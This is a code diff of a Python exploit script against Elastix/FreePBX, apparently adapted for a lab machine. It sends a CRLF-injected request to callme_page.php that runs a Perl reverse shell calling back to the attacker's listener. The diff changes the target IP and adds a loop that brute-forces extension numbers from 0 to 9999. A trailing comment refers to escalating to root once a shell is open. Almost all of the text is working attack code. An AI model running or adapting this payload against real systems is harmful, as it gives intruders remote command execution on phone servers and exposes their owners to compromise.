@@ -16,7 +16,7 @@
 ############################################################
 import urllib3
 import ssl
-rhost="10.129.1.226"
+rhost="10.129.221.100"
 lhost="10.10.14.146"
 lport=6000
 extension="1000"
@@ -26,10 +26,11 @@ ssl._create_default_https_context = ssl._create_unverified_context
 
 # Reverse shell payload
 http = urllib3.PoolManager(cert_reqs=ssl.CERT_NONE)
-url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
-r = http.request('GET', url)
-print(r.status)
-print(r.data)
+for i in range(10000):
+    url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(i)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
+    r = http.request('GET', url)
+    print(r.status, i)
+
 # On Elastix, once we have a shell, we can escalate to root:
 # root@bt:~# nc -lvp 443
 # listening on [any] 443 ...
